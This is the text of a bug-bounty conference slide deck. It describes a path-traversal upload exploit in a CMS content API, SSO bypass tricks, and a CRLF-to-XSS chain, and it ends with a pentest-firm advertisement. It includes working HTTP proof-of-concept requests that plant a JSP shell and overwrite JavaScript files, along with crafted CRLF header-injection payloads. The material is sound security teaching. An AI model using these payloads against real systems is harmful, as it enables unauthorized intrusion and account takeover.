Hacking a Bank by Finding a 0day
In collaboration with @infosec_au
Building a PoC
POST /api/content/ HTTP/1.1
Host: re.local:8443
User-Agent: curl/7.64.1
Accept: */*
Content-Length: 1162
Content-Type: multipart/form-data; boundary=------------------------
aadc326f7ae3eac3
Connection: close
--------------------------aadc326f7ae3eac3
Content-Disposition: form-data; name="name"; 
filename="../../../../../../../../../srv/dotserver/tomcat-9.0.41/webapps/ROOT/
html/js/dojo/a.jsp"
Content-Type: text/plain
……
JSP SHELL CODE
--------------------------aadc326f7ae3eac3--
Path Traversal File 
Upload inside Web 
root
Hacking a Bank by Finding a 0day
In collaboration with @infosec_au
Back to the Bank
Web Directory not writeable
Enumerating files/directories
500 Error + Size 0 
= File was written
Hacking a Bank by Finding a 0day
In collaboration with @infosec_au
Back to the Bank
Web Directory not writeable
Enumerating files/directories
500 Error + “could 
not be created” = 
directory does not 
exist
Hacking a Bank by Finding a 0day
In collaboration with @infosec_au
Back to the Bank
Web Directory not writeable
Enumerating files/directories
500 Error + 
“denied” = 
directory exists 
but no 
permissions to 
write files
Hacking a Bank by Finding a 0day
In collaboration with @infosec_au
Back to the Bank
Web root directory not writeable, RIP :(
Other solutions to achieve RCE:
●replacing JAR files
●replacing system files
●adding system config via files
Hacking a Bank by Finding a 0day
In collaboration with @infosec_au
Back to the Bank
Dig deeper….
RCE not possible, we want to 
prove more impact
Solution:
●gadget to replace JavaScript files
Hacking a Bank by Finding a 0day
In collaboration with @infosec_au
Back to the Bank
How to?
● Open javascript file and look for 
ETag in Headers
● Upload file as follow:
filename="../FIRST-CHAR/SECOND-CHAR/FULL-ETAG/
fileAsset/FILE-NAME"
Hacking a Bank by Finding a 0day
In collaboration with @infosec_au
Back to the Bank
E-Tag 
Etag: 23f890f7-ac11-30fe-1e50-a4f446a11211
Hacking a Bank by Finding a 0day
In collaboration with @infosec_au
Back to the Bank
PoC
POST /api/content/ HTTP/1.1
Host: host
Content-Type: multipart/form-data; boundary=------------------------aadc326f7ae3eac3
Content-Length: 37406
--------------------------aadc326f7ae3eac3
Content-Disposition: form-data; name="name"; filename="../2/3/23f890f7-ac22-40fe-9e50-
a5f446a66255/fileAsset/positiveImpactInternetJs.js"
Content-Type: text/plain
console.log('hussein98d-shubs-poc');
--------------------------aadc326f7ae3eac3--
Hacking a Bank by Finding a 0day
In collaboration with @infosec_au
Back to the Bank
Result:
Stored XSS on all hosts, ability to overwrite index file 
and others
SSO Bypass Techniques
Shall we enter?
Nowadays most 
organizations use SSO 
for internal panels login 
and restricted resources 
SSO Bypass Techniques
Shall we enter?
Might be handy to:
● Brute force directories
● Look for weak 
passwords
●Try to hit APIs directly 
● Fancy other vectors
SSO Bypass Techniques
Shall we enter?
Fuzzing
Don’t only look for directories & files, brute force parameter on 
each valid endpoint found
Tools:
FFuF
Arjun
Param Miner 
SSO Bypass Techniques
Shall we enter?
Fuzzing
https://admin.org.com
Okta
https://admin.org.com/internal.php?
id=1
200 OK
https://admin.org.com/blabla
404 Not found
https://admin.org.com/internal.php
301 Redirect
SSO Bypass Techniques
Shall we enter?
APIs
https://admin.org.com  
200 OK then redirect to SSO
view-source:https://admin.org.com  
/api/admin/users
https://admin.org.com/api/admin/users
200 OK
SSO Bypass Techniques
Shall we enter?
Less known 
Grab wordlist here 
https://gist.github.com/securifera/e7eed730cbe1ce43d0c29d7cd2d582f4
Brute Force: 
https://org.com/admin/$FUZZ$ 
SSO Bypass Techniques
Shall we enter?
Less known 
SSO Bypass Techniques
Shall we enter?
Less known 
Attempt to access:
https://org.com/admin/;.jpg
https://org.com/admin/valid-file.jsp;.jpg
SSO Bypass Techniques
Shall we enter?
Fancy other vectors
https://internal.org.com
SSO
https://internal.org.com/test.js
SSO
https://internal.org.com/test.jpg
404 Not Found
https://internal.org.com/;.jpg
200 OK
Brute-force different extensions 
and look for how the application 
responds
SSO Bypass Techniques
Shall we enter?
Fancy other vectors
https://internal.org.com
SSO
 dig CNAME internal.org.com    
org.3rdparty.com
gau –subs 3rdparty.com
hey.3rdparty.com/authentication/register
https://internal.org.com/authentication/register
200 OK
Gather Wayback machine and 
AlienVault URLs of the CNAME 
and look for similarities
SSO Bypass Techniques
Shall we enter?
https://internal.org.com/authentication/register
Register → Login 
Full access to organization’s panel
Another XSS Level
Chaining bugs to pop an alert on a Bug Bounty Program
https://org.com/auth/ 
Another XSS Level
Chaining bugs to pop an alert on a Bug Bounty Program
https://org.com/auth/ 
● Application expects inc 
parameter  
● Hostname supplied in 
parameter has to end 
with .org.com
● Path of supplied parameter URL 
should start with /includes/js-
cdn
Another XSS Level
Chaining bugs to pop an alert on a Bug Bounty Program
What do we need?
Subdomain.org.com/includes/js-
cdn/file.js which should contain 
a XSS payload such as:
alert();
Another XSS Level
Chaining bugs to pop an alert on a Bug Bounty Program
Subdomain Takeover, create the 
folders and host the JS file?
No luck – no takeovers
Other possibilities?
Another XSS Level
Chaining bugs to pop an alert on a Bug Bounty Program
Digging Deeper
support.org.com/%0d%0aTest:Testing 
CRLF
Another XSS Level
Chaining bugs to pop an alert on a Bug Bounty Program
Digging Deeper
support.org.com/includes/js-cdn/x.js?
%0d%0aTest:Testing 
CRLF
Another XSS Level
Chaining bugs to pop an alert on a Bug Bounty Program
Digging Deeper
support.org.com/includes/js-cdn/x.js?
%250D%250AContent-
Type:application/javascript%250D
%250A%250D%250Aalert();
CRLF
Set Content-Type to JS
Write alert(); on first line
Another XSS Level
Chaining bugs to pop an alert on a Bug Bounty Program
Digging Deeper
Org.com/auth/?inc=support.org.com/
includes/js-cdn/x.js?%250D
%250AContent-Type:application/
javascript%250D%250A%250D
%250Aalert();
Problem:
CORS Issues from org.com to 
support.org.com
Another XSS Level
Chaining bugs to pop an alert on a Bug Bounty Program
Digging Deeper
Solution: use CRLF to allow origin
Org.com/auth/?inc=support.org.com/
includes/js-cdn/x.js?%250D
%250AAccess-Control-Allow-Origin:
%20https:%2F%2Forg.com%250D
%250AContent-Type:application/
javascript%250D%250A%250D
%250Aalert();
Another XSS Level
Chaining bugs to pop an alert on a Bug Bounty Program
Digging Deeper
Wrap-Up
● Find another subdomain of target 
vulnerable to CRLF
● Use CRLF to allow origin
● Use CRLF to set content type
● Use CRLF to write XSS payload on 
page
Another XSS Level
Chaining bugs to pop an alert on a Bug Bounty Program
Done!
Need a Pentest? We got you! WebImmunify.com
! 
Thank you Questions?
@Hussein98D
Discovered 
vulnerabilities
Yet to be found 
vulnerabilities
We provide pentests! Visit WebImmunify.com
October 2022